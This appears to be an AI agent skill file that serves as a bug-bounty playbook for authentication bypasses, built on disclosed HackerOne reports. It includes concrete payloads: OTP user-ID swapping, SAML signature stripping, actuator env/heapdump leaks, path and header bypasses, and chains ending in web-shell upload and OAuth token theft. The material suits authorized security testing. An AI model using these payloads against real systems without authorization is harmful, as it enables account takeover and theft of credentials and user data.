# auth-hunter

Source: `authentication/auth-hunter/SKILL.md` (preserved verbatim during consolidation).

---

---
name: auth
description: "Comprehensive authentication testing: MFA bypass, session fixation, and credential stuffing mitigations."
---

# SKILL: Authentication Vulnerability Hunting [AUTH]

Expert playbook for identifying and exploiting authentication bypasses, administrative logic flaws, and session management vulnerabilities based on top-tier HackerOne reports.

## 1. Core Patterns

### Pattern 1: Improper Session Invalidation via Identity Swapping (OTP)
*   **Architectural Cause:** Server-side logic trusts a user-supplied ID in a "logout" or "re-auth" request to generate a valid session token for that ID without verifying it against the current authenticated session.
*   **H1 Report:** #921780 (Snapchat) - **Critical**
*   **Exact Payload/Endpoint:** 
    ```http
    POST /scauth/otp/droid/logout HTTP/1.1
    Host: gcp.api.snapchat.com
    {
      "user_id": "VICTIM_USER_ID",
      "device_id": "ATTACKER_DEVICE_ID"
    }
    ```
    *Response returns a valid `otp_token` for the victim.*

### Pattern 2: Execution After Redirect (EAR)
*   **Architectural Cause:** Code sends a `302 Found` (redirect) header but fails to call `exit()` or `die()`, allowing the remainder of the "protected" page's logic to execute and return in the response body.
*   **H1 Report:** #683957 (Mail.ru) - **Critical (RCE)**
*   **Exact Payload/Endpoint:** 
    ```bash
    curl -v https://target.com/admin/settings/upload --no-follow-redirect
    ```
    *Look for the full HTML of the admin panel in the 302 response body.*

### Pattern 3: SAML Signature Omission (No-Sig Bypass)
*   **Architectural Cause:** SAML SP (Service Provider) plugin only validates the XML signature if the `<ds:Signature>` tag is present; if omitted, it defaults to trusting the assertion.
*   **H1 Report:** #136169 (OneLogin) - **$10,000**
*   **Exact Payload/Endpoint:** 
    `POST /wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs`
    ```xml
    <!-- Omit the <ds:Signature> block entirely -->
    <saml:Assertion>
      <saml:Subject>
        <saml:NameID>admin@target.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    ```

### Pattern 4: Administrative Logic Bypass (Collaborator Conversion)
*   **Architectural Cause:** Logic for "automatic approval" of accounts fails to distinguish between a "pending/unauthorized" state and an "active" state when emails match.
*   **H1 Report:** #270981 (Shopify) - **$20,000**
*   **Exact Payload/Endpoint:** 
    `POST /admin/settings/account/approve/<PENDING_COLLABORATOR_ID>`
    *Triggered by having a Partner account with the same email as the pending collaborator request.*

### Pattern 5: Exposed Infrastructure Actuators
*   **Architectural Cause:** Framework-level "health" or "management" endpoints are exposed to the public internet without an authentication middleware layer.
*   **H1 Report:** #838635 (Starbucks) - **$12,500**
*   **Exact Payload/Endpoint:** 
    `GET /actuator/env` or `GET /actuator/heapdump`
    *Leaks credentials/secrets that lead to full Auth Bypass.*

---

## 2. Recon Checklist

*   **JS File Targets:**
    *   Search for `/auth/`, `/login`, `/callback`, `/sso/`, `/logout`.
    *   Look for hardcoded client secrets or `client_id` for third-party SSO (OAuth/SAML).
*   **Parameter Names:** `user_id`, `uid`, `account_id`, `redirect_uri`, `state`, `nonce`, `SAMLResponse`, `otp_token`.
*   **Hidden Endpoint Discovery:**
    *   Fuzz for `/.well-known/` (e.g., `openid-configuration`).
    *   Check for dev/debug endpoints: `/admin/debug`, `/_debugbar`, `/env`.
*   **Burp Extensions:** 
    *   **SAML Raider:** For signature wrapping and omission tests.
    *   **OAuth Hacker:** For redirect_uri and state manipulation.
    *   **Param Miner:** For identifying hidden auth-related headers (e.g., `X-Forwarded-User`).
*   **ID Enumeration Types:** Sequential IDs (1001, 1002), UUIDs leaked in public profiles, and email-to-ID mappings in "Forgot Password" flows.

---

## 3. ID/Target Discovery

*   **Public API Leaks:** Many mobile apps leak internal `user_id` values in "Find Friends" or "Search" results (Refer to #921780).
*   **Metadata Endpoints:** Check `/api/v1/users/self` or similar to see the structure of your own ID, then try to find others.
*   **Insecure Password Reset:** Submit a reset request for a victim; if the response contains the victim's internal ID or a "success_url" with a token, investigate.
*   **SAML/SSO Metadata:** Access `https://target.com/saml/metadata` to find the `EntityID` and `AssertionConsumerService` locations.

---

## 4. Bypass Techniques

1.  **Stop-Redirect (EAR):** Use `curl` without `-L` or Burp Intercept to view 302/301 response bodies for sensitive data (#683957).
2.  **SAML Signature Stripping:** Remove the entire `<ds:Signature>` block from the SAMLResponse (#136169).
3.  **Path Normalization:** Bypass WAF/Auth filters using `..;/` or `//` (e.g., `/auth/..;/admin/settings`).
4.  **Header Injection:** Add `X-Original-URL: /admin` or `X-Rewrite-URL: /admin` to requests to internal gateways.
5.  **Parameter Pollution:** Send `user_id=ATTACKER&user_id=VICTIM` to see which one the backend prioritizes in the auth check.
6.  **Method Swapping:** If `POST /admin/delete` is blocked, try `GET` or `PUT`.

---

## 5. High-Value Targets

1.  **SSO Callback Endpoints:** `/auth/callback`, `/saml/acs` (Highest payout due to full ATO risk).
2.  **Account Recovery/Reset:** `/password/reset/confirm`, `/account/recover` (#2443228).
3.  **Administrative Panels:** `/admin`, `/v1/internal/manage` (#270981).
4.  **Identity Provider (IdP) Integrations:** `/connect/onelogin`, `/connect/okta`.
5.  **Infrastructure Management:** `/actuator/`, `/api/v1/nodes` (#838635).

---

## 6. Chaining Playbook

*   **Subdomain Takeover + Auth Bypass:** Take over `dev.target.com` $\rightarrow$ Steal session cookies scoped to `*.target.com` (#335330).
*   **Auth Bypass + File Upload → RCE:** Bypass auth via EAR $\rightarrow$ Access hidden upload form $\rightarrow$ Upload web shell (#683957).
*   **Info Disclosure + Account Takeover:** Leak environment variables via `/actuator/env` $\rightarrow$ Steal AWS keys/DB creds $\rightarrow$ Modify user records in DB (#838635).
*   **Open Redirect + OAuth Token Theft:** Chain a redirect in `redirect_uri` $\rightarrow$ Leak OAuth `code` or `access_token` to attacker server.

---

## 7. Variant-Specific: Logic Flaws in Multi-Step Auth

The highest-paying variant is often **State Manipulation in Multi-Step Flows** (e.g., #921780).
*   **The Flaw:** The application uses a temporary session or "partial auth" state during OTP, 2FA, or Account Recovery.
*   **The Exploit:** An attacker completes Step 1 for themselves, then switches the ID/Email in Step 2 to the victim. If the server only checks "is the current session in Step 2 state?" rather than "is this Step 2 for the same user as Step 1?", the bypass succeeds.

---

## 8. Automation

*   **Burp Intruder:** 
    *   **Attack Type:** Pitchfork.
    *   **Payloads:** List of victim `user_ids` in one, and a constant "logout" request in the other. 
    *   **Goal:** Automate the "Logout Token Leak" pattern (#921780).
*   **FFUF Command:**
    ```bash
    ffuf -u https://target.com/FUZZ -w auth_endpoints.txt -mc 302 -v | grep "Content-Length: [not 0]"
    ```
    *Finds EAR (Execution After Redirect) vulnerabilities by looking for 302 responses with non-zero body lengths.*
*   **Response Diffing:** Use the **HTTP Request Smuggler** or **Copy as Python Request** to compare responses between an authenticated user and an "unauthenticated-but-redirect-blocked" request.

---

## 9. Triage

*   **Verification:** You MUST prove you can access data or perform an action belonging to another user or an administrator. A 302 response with "Admin Panel" in the title is not enough; you must show the underlying HTML contains sensitive info.
*   **Severity Scoring:**
    *   **Critical ($10k-$20k):** Pre-auth RCE (#591295), Full ATO via logic flaw (#921780, #270981).
    *   **High ($3k-$8k):** Access to PII of all users, Admin access without RCE.
    *   **Medium ($500-$2k):** Access to one's own data in a restricted area, Information disclosure of non-sensitive internal paths.

---

## 10. Report Template

### Title: [CRITICAL] Full Account Takeover via Improper Session Validation in [ENDPOINT]

**Summary:**
A logic flaw in the [SPECIFIC FLOW, e.g., Logout/OTP] allows an unauthenticated attacker to obtain a valid session token for any user by providing their `user_id`. This leads to a full account takeover without user interaction.

**Description:**
The endpoint `[ENDPOINT_PATH]` does not properly validate that the `user_id` provided in the request body belongs to the active session. By manipulating this ID, the server issues a token for the targeted user.

**Steps to Reproduce:**
1. Identify the victim's `user_id` (e.g., via [EXPLANATION]).
2. Log into an attacker account and intercept the request to `[ENDPOINT_PATH]`.
3. Change the `user_id` parameter to the victim's ID:
   `Payload: {"user_id": "[VICTIM_ID]", ...}`
4. Observe that the response contains a valid token for the victim.
5. Use this token to log in via `[LOGIN_ENDPOINT]`.

**Impact:**
Full administrative access to any user account, including the ability to change emails, passwords, and access sensitive PII.

**Reference:**
Based on patterns observed in HackerOne report #921780.

